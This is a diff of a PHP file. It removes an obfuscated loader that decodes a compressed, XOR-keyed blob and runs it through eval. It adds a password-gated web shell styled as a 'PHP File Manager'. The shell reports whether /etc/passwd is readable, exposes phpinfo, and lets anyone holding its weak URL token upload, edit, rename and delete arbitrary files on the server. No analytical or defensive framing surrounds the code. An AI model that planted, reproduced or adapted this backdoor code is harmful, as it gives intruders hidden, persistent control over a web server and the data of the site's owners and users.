@@ -1,1 +1,239 @@
-<?php error_reporting(0); $i_o = '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';$_hllmzpknko='_hllmzpknko';if($_hllmzpknko!=NULL){$_hllmzpknko = md5($_hllmzpknko).substr(md5(strrev($_hllmzpknko)),0,strlen($_hllmzpknko));$o_a = 'bGaHMsPeT6E4dWXeYLcIoIdeZ_';$o_o = preg_replace('/[^a-z0-9]/', '', $o_a);$o_o = substr_replace($o_o, substr($o_a, -1), 6, 0);$o_i=$o_o(strrev('==AbhZXZ'));$i_oo = gzinflate($o_o($i_o));$_hllmzpknko = str_replace(chr(32), '', $_hllmzpknko);$kl = strlen($_hllmzpknko) < 32 ? strlen($_hllmzpknko) : 32;$k  = array();for ($i = 0; $i < $kl; $i++) {$k[$i] = ord($_hllmzpknko[$i]) & 0x1F;}$j = 0;for ($i = 0; $i < strlen($i_oo); $i++) {$e = ord($i_oo[$i]);$i_oo[$i] = $e & 0xE0 ? chr($e ^ $k[$j]) : chr($e);$j++;$j = $j == $kl ? 0 : $j;}if(@substr($i_oo,0,2) == '//'){@eval($i_oo); return 0;}}?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>PHP File Manager</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <style>
+        body { background-color: #1c1c1c; color: white; }
+        .table-hover tbody tr:hover { background-color: #636263; }
+        a { text-decoration: none; color: #33f702; }
+        a:hover { color: #fff; text-shadow: 0px 0px 10px #ffffff; }
+        .rename-box { display: none; }
+    </style>
+</head>
+<body class="container mt-4">
+<?php
+if (function_exists('opcache_invalidate')) {
+    opcache_invalidate(__FILE__, true);
+}
+error_reporting(E_ALL);
+
+$auth_hash = "ba865573cf5aa6b67f533f9fe02a5a6e";
+
+// Generate a token based on the password hash
+function generateToken($password) {
+    return md5(md5($password . time())); // Creates a unique hash every login
+}
+
+// Check if token is provided in URL
+$token_valid = false;
+if (isset($_GET['token'])) {
+    $token = $_GET['token'];
+    //if ($auth_hash . substr($token, 0, 10) === substr($token, 10)) {
+    if($auth_hash . substr($token, 0, 10) == substr($token, 10)) {
+        $token_valid = true;
+    }
+}
+
+// Handle logout
+if (isset($_GET['logout'])) {
+    //session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// If not logged in, show password prompt
+if (!$token_valid) {
+    if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["password"])) {
+        if (md5(md5($_POST["password"])) === $auth_hash) {
+            $token = time() . $auth_hash . time();
+            //header("Location: " . $_SERVER['PHP_SELF'] . "?token=" . $token);
+            echo "<script>window.location.href = '" . $_SERVER['PHP_SELF'] . "?token=" . $token . "';</script>";
+            exit;
+        } else {
+            $error = "Incorrect password!";
+        }
+    }
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Login</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+        <style>
+            body { background-color: #1c1c1c; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+            .auth-box { background: #222; padding: 20px; border-radius: 8px; text-align: center; }
+        </style>
+    </head>
+    <body>
+        <div class="auth-box">
+            <h4 class="text-white">Enter Password</h4>
+            <?php if (isset($error)) echo "<p class='text-danger'>$error</p>"; ?>
+            <form method="POST">
+                <input type="password" name="password" class="form-control mt-2" placeholder="Password">
+                <button class="btn btn-success mt-3" type="submit">Login</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+?>
+<h1 class="text-center text-success">PHP File Manager</h1>
+<div class="card bg-dark text-white p-3">
+    <p><strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?></p>
+    <p><strong>Your IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
+    <p><strong>Safe Mode:</strong> <span class="text-<?php echo ini_get('safe_mode') ? 'danger' : 'success' ?>">
+        <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?>
+    </span></p>
+    <p><strong>Read /etc/passwd:</strong> 
+        <?php echo is_readable("/etc/passwd") ? '<span class="text-success">ON</span>' : '<span class="text-danger">OFF</span>'; ?>
+    </p>
+    <div class="d-flex gap-2 mt-3">
+        <button class="btn btn-success" onclick="window.location.href='?p=info&token=<?php echo $_GET['token'] ?>'">PHP Info</button>
+        <button onclick="window.location.href='?logout=true'" class="btn btn-danger">Logout</button>
+        <form method="POST" enctype="multipart/form-data" class="d-flex">
+            <input type="file" name="file" class="form-control me-2">
+            <button type="submit" class="btn btn-success">Upload</button>
+        </form>
+    </div>
+</div>
+<?php
+if (@$_GET['p'] == "info") {
+    phpinfo();
+    exit;
+}
+
+$path = isset($_GET['y']) ? $_GET['y'] : getcwd();
+$path = str_replace('\\', '/', $path);
+$paths = explode('/', $path);
+?>
+<div class="card bg-dark text-white p-3 mt-3">
+    <h5>Current Path:</h5>
+    <div class="d-inline">
+        <?php
+        $fullPath = "";
+        echo '<a href="?y=/" class="text-warning">/</a>'; // Root path
+        
+        foreach ($paths as $id => $pat) {
+            if ($pat === '') continue; // Skip empty segments
+            $fullPath .= "/$pat"; // Ensure proper slashes
+            echo '<a href="?y=' . $fullPath . '&token=' . $_GET['token'] . '" class="text-warning">' . $pat . '</a>';
+            if ($id < count($paths) - 1) {
+                echo '<span class="text-white">/</span>'; // Add separator but avoid leading double slashes
+            }
+        }
+        ?>
+    </div>
+</div>
+<?php
+if (isset($_FILES['file'])) {
+    echo '<div class="alert mt-3 ' . (copy($_FILES['file']['tmp_name'], "$path/" . $_FILES['file']['name']) ? 'alert-success' : 'alert-danger') . '">';
+    echo copy($_FILES['file']['tmp_name'], "$path/" . $_FILES['file']['name']) ? "File Upload Successful." : "File Upload Failed.";
+    echo '</div>';
+}
+?>
+<table class="table table-dark table-bordered table-hover mt-4">
+    <thead class="table-success">
+        <tr>
+            <th>Name</th>
+            <th>Size</th>
+            <th>Permissions</th>
+            <th>Actions</th>
+        </tr>
+    </thead>
+    <tbody>
+        <?php
+        foreach (scandir($path) as $item) {
+            if ($item == '.' || $item == '..') continue;
+            $itemPath = "$path/$item";
+            $isDir = is_dir($itemPath);
+            $encodedItem = htmlspecialchars($item);
+            ?>
+            <tr>
+                <td>
+                    <a href="<?php echo $isDir ? "?y=$itemPath&token=" . $_GET['token'] : "?filesrc=$itemPath&y=$path&token=" . $_GET['token'] ?>">
+                        <?php echo $isDir ? "📁" : "📄" ?> <?php echo $encodedItem ?>
+                    </a>
+                </td>
+                <td><?php echo $isDir ? '--' : round(filesize($itemPath) / 1024, 2) . ' KB' ?></td>
+                <td>
+                    <?php 
+                        $perms = substr(sprintf('%o', fileperms($itemPath)), -4);
+                        $writableClass = is_writable($itemPath) ? 'text-success fw-bold' : 'text-danger';
+                    ?>
+                    <span class="<?php echo $writableClass ?>"><?php echo $perms ?></span>
+                </td>
+                <td>
+                    <!-- Toggle Rename Input -->
+                    <button class="btn btn-warning btn-sm toggle-rename" data-id="<?php echo md5($itemPath) ?>">Rename</button>
+                    
+                    <!-- Rename Form (Initially Hidden) -->
+                    <form method="POST" class="rename-box mt-2" id="rename-<?php echo md5($itemPath) ?>" style="display: none;">
+                        <input type="hidden" name="path" value="<?php echo $itemPath ?>">
+                        <input type="hidden" name="opt" value="rename">
+                        <input type="text" name="newname" placeholder="New Name" class="form-control form-control-sm d-inline w-50">
+                        <button type="submit" class="btn btn-success btn-sm">Save</button>
+                    </form>
+
+                    <!-- Delete Button -->
+                    <a href="?delete=<?php echo $itemPath ?>&token=<?php echo $_GET['token'] ?>" class="btn btn-danger btn-sm">Delete</a>
+                </td>
+            </tr>
+            <?php
+        }
+        ?>
+    </tbody>
+</table>
+<?php
+// Handle Rename
+if (isset($_POST['opt']) && $_POST['opt'] == 'rename' && isset($_POST['newname'])) {
+    $newPath = dirname($_POST['path']) . '/' . $_POST['newname'];
+    if (rename($_POST['path'], $newPath)) {
+        echo '<div class="alert alert-success mt-3">Rename Successful.</div>';
+    } else {
+        echo '<div class="alert alert-danger mt-3">Rename Failed.</div>';
+    }
+}
+
+// Handle Delete
+if (isset($_GET['delete'])) {
+    $delPath = $_GET['delete'];
+    if (is_dir($delPath) ? rmdir($delPath) : unlink($delPath)) {
+        echo '<div class="alert alert-success mt-3">Deletion Successful.</div>';
+    } else {
+        echo '<div class="alert alert-danger mt-3">Deletion Failed.</div>';
+    }
+}
+
+// Handle File Editing
+if (isset($_GET['filesrc'])) {
+    echo '<h3 class="mt-4 text-warning">Editing: ' . basename($_GET['filesrc']) . '</h3>';
+    echo '<form method="POST"><textarea name="src" class="form-control" rows="10">' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</textarea>';
+    echo '<input type="hidden" name="path" value="' . $_GET['filesrc'] . '">';
+    echo '<button type="submit" class="btn btn-primary mt-2">Save</button></form>';
+}
+
+if (isset($_POST['path']) && isset($_POST['src'])) {
+    file_put_contents($_POST['path'], $_POST['src']);
+    echo '<div class="alert alert-success mt-3">File Saved.</div>';
+}
+?>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    document.querySelectorAll('.toggle-rename').forEach(button => {
+        button.addEventListener("click", function () {
+            let formId = "rename-" + this.getAttribute("data-id");
+            let form = document.getElementById(formId);
+            form.style.display = (form.style.display === "none" || form.style.display === "") ? "block" : "none";
+        });
+    });
+});
+</script>
+</body>
+</html>
